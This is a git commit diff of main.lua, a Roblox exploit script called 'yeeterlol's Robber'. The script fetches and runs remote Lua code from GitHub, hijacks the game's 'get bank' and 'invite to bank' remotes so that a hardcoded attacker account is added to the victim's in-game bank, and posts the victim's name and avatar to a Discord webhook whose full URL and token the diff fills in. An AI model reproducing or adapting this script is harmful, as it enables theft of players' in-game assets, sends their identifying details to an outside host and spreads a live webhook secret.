8289f6b7c299189410280a4b5810ac879a8e7120
RealAlexHey <146685724+RealAlexHey@users.noreply.github.com>
2023-10-02 12:43:10 +1100

    Update main.lua

--- main.lua
+++ main.lua
@@ -2,13 +2,13 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/exxtremestuffs/SimpleSpySource/master/SimpleSpy.lua", true))()
 
 -- The ID that will get invited to the bank
-local id = 1
+local id = 446919102
 -- Discord webhook
-local webhook = false
-local link = ""
+local webhook = true
+local link = "https://discord.com/api/webhooks/1158215479366778901/yp1rh2EPonkthItVx9t50xZ1448F4noB7Z_nbY23PBQe8SvdS8b4U4y6rr0_vZSu7wcj"
 
 -- Catch Get Bank remote
-SimpleSpy:GetRemoteFiredSignal(workspace.__THINGS.__REMOTES:FindFirstChild("get bank")):Connect(function(args)
+SimpleSpy:GetRemoteFiredSignal(workspace.THINGS.REMOTES:FindFirstChild("get bank")):Connect(function(args)
     local bankId = args[1][1]
     return bankId
 end)
@@ -20,7 +20,7 @@ local Invite = {
     }
 }
 
-workspace.__THINGS.__REMOTES:FindFirstChild("invite to bank"):InvokeServer(unpack(Invite))
+workspace.THINGS.REMOTES:FindFirstChild("invite to bank"):InvokeServer(unpack(Invite))
 
 if webhook == true then
     local Content = 'Someone got their bank stolen!'
@@ -29,11 +29,11 @@ if webhook == true then
         ["description"] = "Name: "..plr.Name.."\nDisplay Name: "..plr.DisplayName,
         ["type"] = "rich",
         ["color"] = tonumber(0xffff00),
-	    ["image"] = {
-		        ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
-		    },
+        ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
+            },
     }
-	
+
     (syn and syn.request or http_request or http.request) {
         Url = link;
         Method = 'POST';
@@ -43,5 +43,5 @@ if webhook == true then
         Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}});
     };
 else
-	print("[yeeterlol's Robber]: No Webhook detected, continuing...")
+    print("[yeeterlol's Robber]: No Webhook detected, continuing...")
 end
